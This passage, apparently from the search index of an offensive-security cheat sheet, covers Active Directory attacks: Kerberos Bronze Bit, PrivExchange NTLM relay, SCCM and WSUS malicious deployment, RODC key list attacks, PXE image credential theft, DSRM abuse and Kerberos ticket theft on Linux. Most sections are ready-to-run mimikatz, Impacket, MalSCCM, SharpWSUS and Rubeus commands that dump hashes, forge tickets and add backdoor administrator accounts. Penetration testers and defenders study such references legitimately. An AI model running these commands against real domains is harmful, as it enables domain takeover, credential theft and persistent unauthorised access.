</ol>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-bronze-bit-attack-cve-2020-17049","title":"Kerberos Bronze Bit Attack - CVE-2020-17049","text":"<p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated.</p> <p>Patch is out on November 10, 2020, DC are most likely vulnerable until February 2021.</p> <p> Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p> <p>Requirements: * Service account's password hash  * Service account's with <code>Constrained Delegation</code> or <code>Resource Based Constrained Delegation</code> * Impacket PR #1013 </p> <p>Attack #1 - Bypass the <code>Trust this user for delegation to specified services only \u2013 Use Kerberos only</code> protection and impersonate a user who is protected from delegation.</p> <pre><code># forwardable flag is only protected by the ticket encryption which uses the service account's password \n$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes &lt;LM:NTLM hash&gt; -aesKey &lt;AES hash&gt; test.local/Service1 -force-forwardable -dc-ip &lt;Domain controller&gt; # -&gt; Forwardable\n$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit\n# Access \"c$\"\nls \\\\service2.test.local\\c$\n</code></pre> <p>Attack #2 - Write Permissions to one or more objects in the AD</p> <pre><code># Create a new machine account\nImport-Module .\\Powermad\\powermad.ps1\nNew-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)\n.\\mimikatz\\mimikatz.exe \"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\" exit\n# Set PrincipalsAllowedToDelegateToAccount\nInstall-WindowsFeature RSAT-AD-PowerShell\nImport-Module ActiveDirectory\nGet-ADComputer AttackerService\nSet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$\nGet-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount\n# Execute the attack\npython .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit | Out-Null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#privexchange-attack","title":"PrivExchange attack","text":"<p>Exchange your privileges for Domain Admin privs by abusing Exchange.    You need a shell on a user account with a mailbox.</p> <ol> <li> <p>Exchange server hostname or IP address</p> <pre><code>pth-net rpc group members \"Exchange Servers\" -I dc01.domain.local -U domain/username\n</code></pre> </li> <li> <p>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).</p> <pre><code>ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username\n</code></pre> </li> <li> <p>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.</p> <pre><code># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py\npython privexchange.py -ah xxxxxxx -u xxxx -d xxxxx\npython privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange\n\n# https://github.com/G0ldenGunSec/PowerPriv \npowerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016\n</code></pre> </li> <li> <p>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash</p> <pre><code>python secretsdump.py xxxxxxxxxx -just-dc\npython secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm\n</code></pre> </li> <li> <p>Clean your mess and restore a previous state of the user's ACL</p> <pre><code>python aclpwn.py --restore ../aclpwn-20190319-125741.restore\n</code></pre> </li> </ol> <p>Alternatively you can use the Metasploit module </p> <p><code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></p> <p>Alternatively you can use an all-in-one tool : Exchange2domain.</p> <pre><code>git clone github.com/Ridter/Exchange2domain \npython Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip\npython Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#sccm-deployment","title":"SCCM Deployment","text":"<p>SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.</p> <ul> <li>PowerSCCM - PowerShell module to interact with SCCM deployments</li> <li> <p>MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage</p> </li> <li> <p>Using SharpSCCM <pre><code>.\\SharpSCCM.exe get device --server &lt;SERVER8NAME&gt; --site-code &lt;SITE_CODE&gt;\n.\\SharpSCCM.exe &lt;server&gt; &lt;sitecode&gt; exec -d &lt;device_name&gt; -r &lt;relay_server_ip&gt;\n.\\SharpSCCM.exe exec -d WS01 -p \"C:\\Windows\\System32\\ping 10.10.10.10\" -s --debug\n</code></pre></p> </li> <li>Compromise client, use locate to find management server      <pre><code>MalSCCM.exe locate\n</code></pre></li> <li>Enumerate over WMI as an administrator of the Distribution Point     <pre><code>MalSCCM.exe inspect /server:&lt;DistributionPoint Server FQDN&gt; /groups\n</code></pre></li> <li>Compromise management server, use locate to find primary server</li> <li>Use <code>inspect</code> on primary server to view who you can target     <pre><code>MalSCCM.exe inspect /all\nMalSCCM.exe inspect /computers\nMalSCCM.exe inspect /primaryusers\nMalSCCM.exe inspect /groups\n</code></pre></li> <li> <p>Create a new device group for the machines you want to laterally move too     <pre><code>MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device\nMalSCCM.exe inspect /groups\n</code></pre></p> </li> <li> <p>Add your targets into the new group      <pre><code>MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL\n</code></pre></p> </li> <li> <p>Create an application pointing to a malicious EXE on a world readable share : <code>SCCMContentLib$</code> <pre><code>MalSCCM.exe app /create /name:demoapp /uncpath:\"\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\"\nMalSCCM.exe inspect /applications\n</code></pre></p> </li> <li> <p>Deploy the application to the target group      <pre><code>MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment\nMalSCCM.exe inspect /deployments\n</code></pre></p> </li> <li> <p>Force the target group to checkin for updates      <pre><code>MalSCCM.exe checkin /groupname:TargetGroup\n</code></pre></p> </li> <li> <p>Cleanup the application, deployment and group     <pre><code>MalSCCM.exe app /cleanup /name:demoapp\nMalSCCM.exe group /delete /groupname:TargetGroup\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#sccm-network-access-accounts","title":"SCCM Network Access Accounts","text":"<p>If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.</p> <ul> <li>Find SCCM blob     <pre><code>Get-Wmiobject -namespace \"root\\ccm\\policy\\Machine\\ActualConfig\" -class \"CCM_NetworkAccessAccount\"\nNetworkAccessPassword : &lt;![CDATA[E600000001...8C6B5]]&gt;\nNetworkAccessUsername : &lt;![CDATA[E600000001...00F92]]&gt;\n</code></pre></li> <li>Using GhostPack/SharpDPAPI or Mayyhem/SharpSCCM for SCCM retrieval and decryption     <pre><code>.\\SharpDPAPI.exe SCCM\n.\\SharpSCCM.exe get naa -u USERNAME -p PASSWORD\n</code></pre></li> <li>Check ACL for the CIM repository located at <code>C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA</code>:     <pre><code>Get-Acl C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA | Format-List -Property PSPath,sddl\nConvertFrom-SddlString \"\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#sccm-shares","title":"SCCM Shares","text":"<p>Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares</p> <ul> <li>1njected/CMLoot <pre><code>Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt\nInvoke-CMLootDownload -SingleFile \\\\sccm\\SCCMContentLib$\\DataLib\\SC100001.1\\x86\\MigApp.xml\nInvoke-CMLootDownload -InventoryFile .\\sccmfiles.txt -Extension msi\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#wsus-deployment","title":"WSUS Deployment","text":"<p>Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network</p> <p> The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.</p> <ul> <li> <p>SharpWSUS</p> </li> <li> <p>Locate using <code>HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate</code> or <code>SharpWSUS.exe locate</code></p> </li> <li>After WSUS Server compromise: <code>SharpWSUS.exe inspect</code></li> <li>Create a malicious patch: <code>SharpWSUS.exe create /payload:\"C:\\Users\\ben\\Documents\\pk\\psexec.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"net user WSUSDemo Password123! /add ^&amp; net localgroup administrators WSUSDemo /add\\\"\" /title:\"WSUSDemo\"</code></li> <li>Deploy it on the target: <code>SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\"Demo Group\"</code></li> <li>Check status deployment: <code>SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local</code></li> <li>Clean up: <code>SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u201dDemo Group</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#rodc-read-only-domain-controller","title":"RODC - Read Only Domain Controller","text":"<p>RODCs are an alternative for Domain Controllers in less secure physical locations - Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded) - Any user or group specified in the managedBy attribute of an RODC has local admin access to the RODC server</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#rodc-golden-ticket","title":"RODC Golden Ticket","text":"<ul> <li>You can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC\u2019s msDS-RevealOnDemandGroup attribute and not in the RODC\u2019s msDS-NeverRevealGroup attribute</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#rodc-key-list-attack","title":"RODC Key List Attack","text":"<p>Requirements: * Impacket PR #1210 - The Kerberos Key List Attack * krbtgt credentials of the RODC (-rodcKey)  * ID of the krbtgt account of the RODC (-rodcNo)</p> <ul> <li>using Impacket   <pre><code># keylistattack.py using SAMR user enumeration without filtering (-full flag)\nkeylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full\n# keylistattack.py defining a target username (-t flag)\nkeylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST\n# secretsdump.py using the Kerberos Key List Attack option (-use-keylist)\nsecretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist\n</code></pre></li> <li>Using Rubeus   <pre><code>Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871\nRubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#rodc-computer-object","title":"RODC Computer Object","text":"<p>When you have one the following permissions to the RODC computer object: GenericWrite, GenericAll, WriteDacl, Owns, WriteOwner, WriteProperty.</p> <ul> <li>Add a domain admin account to the RODC's msDS-RevealOnDemandGroup attribute    <pre><code>PowerSploit&gt; Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pxe-boot-image-attack","title":"PXE Boot image attack","text":"<p>PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.</p> <ul> <li>Press [F8] during the PXE boot to spawn an administrator console on the deployed machine.</li> <li> <p>Press [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.</p> <pre><code>net user hacker Password123! /add\nnet localgroup administrators /add hacker\n</code></pre> </li> <li> <p>Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.</p> <pre><code># Import the module\nPS &gt; Import-Module .\\PowerPXE.ps1\n# Start the exploit on the Ethernet interface\nPS &gt; Get-PXEcreds -InterfaceAlias Ethernet\nPS &gt; Get-PXECreds -InterfaceAlias \u00ab lab 0 \u00bb \n# Wait for the DHCP to get an address\n&gt;&gt; Get a valid IP address\n&gt;&gt;&gt; &gt;&gt;&gt; DHCP proposal IP address: 192.168.22.101\n&gt;&gt;&gt; &gt;&gt;&gt; DHCP Validation: DHCPACK\n&gt;&gt;&gt; &gt;&gt;&gt; IP address configured: 192.168.22.101\n# Extract BCD path from the DHCP response\n&gt;&gt; Request BCD File path\n&gt;&gt;&gt; &gt;&gt;&gt; BCD File path:  \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd\n&gt;&gt;&gt; &gt;&gt;&gt; TFTP IP Address:  192.168.22.3\n# Download the BCD file and extract wim files\n&gt;&gt; Launch TFTP download\n&gt;&gt;&gt;&gt; Transfer succeeded.\n&gt;&gt; Parse the BCD file: conf.bcd\n&gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim\n&gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim\n&gt;&gt; Launch TFTP download\n&gt;&gt;&gt;&gt; Transfer succeeded.\n# Parse wim files to find interesting data\n&gt;&gt; Open LiteTouchPE_x86.wim\n&gt;&gt;&gt;&gt; Finding Bootstrap.ini\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\\\LAB-MDT\\DeploymentShare$\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = MdtService\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = Somepass1\n</code></pre> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dns-reconnaissance","title":"DNS Reconnaissance","text":"<p>Perform ADIDNS searches</p> <pre><code>StandIn.exe --dns --limit 20\nStandIn.exe --dns --filter SQL --limit 10\nStandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\nStandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dsrm-credentials","title":"DSRM Credentials","text":"<p>Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.</p> <p>This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.</p> <pre><code>Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"'\n# Check if the key exists and get the value\nGet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior \n# Create key with value \"2\" if it doesn't exist\nNew-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD \n# Change value to \"2\"\nSet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#linux-active-directory","title":"Linux Active Directory","text":""},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-tmp","title":"CCACHE ticket reuse from /tmp","text":"<p>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions</p> <p>List the current ticket used for authentication with <code>env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code>export KRB5CCNAME=/tmp/ticket.ccache</code>. Kerberos ticket name format is <code>krb5cc_%{uid}</code> where uid is the user UID. </p> <pre><code>$ ls /tmp/ | grep krb5cc\nkrb5cc_1000\nkrb5cc_1569901113\nkrb5cc_1569901115\n$ export KRB5CCNAME=/tmp/krb5cc_1569901115\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-keyring","title":"CCACHE ticket reuse from keyring","text":"<p>Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey</p> <pre><code># Configuration and build\ngit clone https://github.com/TarlogicSecurity/tickey\ncd tickey/tickey\nmake CONF=Release\n[root@Lab-LSV01 /]# /tmp/tickey -i\n[*] krb5 ccache_name = KEYRING:session:sess_%{uid}\n[+] root detected, so... DUMP ALL THE TICKETS!!\n[*] Trying to inject in tarlogic[1000] session...\n[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache\n[*] Trying to inject in velociraptor[1120601115] session...\n[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache\n[*] Trying to inject in trex[1120601113] session...\n[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache\n[X] [uid:0] Error retrieving tickets\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-sssd-kcm","title":"CCACHE ticket reuse from SSSD KCM","text":"<p>SSSD maintains a copy of the database at the path <code>/var/lib/sss/secrets/secrets.ldb</code>.  The corresponding key is stored as a hidden file at the path <code>/var/lib/sss/secrets/.secrets.mkey</code>.  By default, the key is only readable if you have root permissions.</p> <p>Invoking <code>SSSDKCMExtractor</code> with the --database and --key parameters will parse the database and decrypt the secrets.</p> <pre><code>git clone https://github.com/fireeye/SSSDKCMExtractor\npython3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey\n</code></pre> <p>The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-keytab","title":"CCACHE ticket reuse from keytab","text":"<pre><code>git clone https://github.com/its-a-feature/KeytabParser\npython KeytabParser.py /etc/krb5.keytab\nklist -k /etc/krb5.keytab\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-accounts-from-etckrb5keytab","title":"Extract accounts from /etc/krb5.keytab","text":"<p>The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. </p> <p>Use <code>klist</code> to read the keytab file and parse its content. The key that you see when the key type is 23  is the actual NT Hash of the user.</p> <pre><code>$ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab\n[...]\n[26] Service principal: host/COMPUTER@DOMAIN\nKVNO: 25\nKey type: 23\nKey: 31d6cfe0d16ae931b73c59d7e0c089c0\nTime stamp: Oct 07,  2019 09:12:02\n[...]\n</code></pre> <p>On Linux you can use <code>KeyTabExtract</code>: we want RC4 HMAC hash to reuse the NLTM hash.</p> <pre><code>$ python3 keytabextract.py krb5.keytab \n[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck\n[+] Keytab File successfully imported.\nREALM : DOMAIN\nSERVICE PRINCIPAL : host/computer.domain\nNTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky\n</code></pre> <p>On macOS you can use <code>bifrost</code>.</p> <pre><code>./bifrost -action dump -source keytab -path test\n</code></pre> <p>Connect to the machine using the account and the hash with CME.</p> <pre><code>$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H \"31d6cfe0d16ae931b73c59d7e0c089c0\" -d \"DOMAIN\"\nCME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  \n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#references","title":"References","text":"<ul> <li>Explain like I\u2019m 5: Kerberos - Apr 2, 2013 - @roguelynn</li> <li>Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</li> <li>Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</li> <li>Abusing Kerberos: Kerberoasting - Haboob Team</li> <li>Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</li> <li>Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</li> <li>BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</li> <li>Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</li> <li>BlueHat IL - Benjamin Delpy</li> <li>COMPROMISSION DES POSTES DE TRAVAIL GR\u00c2CE \u00c0 LAPS ET PXE MISC n\u00b0 103 - mai 2019 - R\u00e9mi Escourrou, Cyprien Oger </li> <li>Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</li> <li>DiskShadow The return of VSS Evasion Persistence and AD DB extraction</li> <li>Domain Penetration Testing: Using BloodHound, Crackmapexec, &amp; Mimikatz to get Domain Admin</li> <li>Dumping Domain Password Hashes - Pentestlab</li> <li>Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</li> <li>Exploiting PrivExchange - April 11, 2019 - @chryzsh</li> <li>Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</li> <li>Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</li> <li>How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf</li> <li>Fun with LDAP, Kerberos (and MSRPC) in AD Environments</li> <li>Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r</li> <li>Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r</li> <li>Golden ticket - Pentestlab</li> <li>How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</li> <li>Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</li> <li>Invoke-Kerberoast - Powersploit Read the docs</li> <li>Kerberoasting - Part 1 - Mubix \u201cRob\u201d Fuller</li> <li>Passing the hash with native RDP client (mstsc.exe)</li> <li>Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</li> <li>Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</li> <li>Pen Testing Active Directory Environments - Part III:  Chasing Power Users</li> <li>Pen Testing Active Directory Environments - Part IV: Graph Fun</li> <li>Pen Testing Active Directory Environments - Part V: Admins and Graphs</li> <li>Pen Testing Active Directory Environments - Part VI: The Final Case</li> <li>Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</li> <li>Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</li> <li>Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</li> <li>Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith</li> <li>Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</li> <li>Roasting AS-REPs - January 17, 2017 - harmj0y</li> <li>Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</li> <li>Using bloodhound to map the user network - Hausec</li> <li>WHAT\u2019S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 1</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 2</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 3</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 4</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 5</li> <li>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</li> <li>[PrivExchange] From user to domain admin in less than 60sec ! - davy</li> <li>Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y</li> <li>Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY P\u00c9REZ</li> <li>Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf</li> <li>All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</li> <li>Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon</li> <li>Playing with Relayed Credentials - June 27, 2018</li> <li>Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</li> <li>Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</li> <li>How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</li> <li>SMB Share \u2013 SCF File Attacks - December 13, 2017 - @netbiosX</li> <li>Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</li> <li>A Red Teamer\u2019s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</li> <li>Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</li> <li>Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10</li> <li>Active-Directory-Exploitation-Cheat-Sheet - @buftas</li> <li>GPO Abuse - Part 1 - RastaMouse - 6 January 2019</li> <li>GPO Abuse - Part 2 - RastaMouse - 13 January 2019</li> <li>Abusing GPO Permissions - harmj0y - March 17, 2016</li> <li>How To Attack Kerberos 101 - m0chan - July 31, 2019</li> <li>ACE to RCE - @JustinPerdok - July 24, 2020</li> <li>Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</li> <li>Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs</li> <li>CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Practical Exploitation - Jake Karnes - December 8th, 2020</li> <li>CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Theory - Jake Karnes - December 8th, 2020</li> <li>Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory</li> <li>GPO Abuse: \"You can't see me\" - Huy Kha -  July 19, 2019</li> <li>Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017</li> <li>New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018</li> <li>Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell</li> <li>AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</li> <li>Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17</li> <li>Playing with PrintNightmare - 0xdf - Jul 8, 2021</li> <li>Attacking Active Directory: 0 to 0.9 - Eloy P\u00e9rez Gonz\u00e1lez - 2021/05/29</li> <li>Microsoft ADCS \u2013 Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</li> <li>Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</li> <li>NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</li> <li>Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</li> <li>Certified Pre-Owned - Will Schroeder - Jun 17 2021</li> <li>AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</li> <li>NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021</li> <li>UnPAC the hash - The Hacker Recipes</li> <li>Lateral Movement \u2013 WebClient</li> <li>Shadow Credentials: Workstation Takeover Edition - Matthew Creel</li> <li>Certificate templates - The Hacker Recipes</li> <li>CA configuration - The Hacker Recipes</li> <li>Access controls - The Hacker Recipes</li> <li>Web endpoints - The Hacker Recipes</li> <li>sAMAccountName spoofing - The Hacker Recipes</li> <li>CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph</li> <li>ADCS: Playing with ESC4 - Matthew Creel</li> <li>The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</li> <li>AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</li> <li>AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Mart\u00ednez, Kurosh Dabbagh</li> <li>Introducing the Golden GMSA Attack - YUVAL 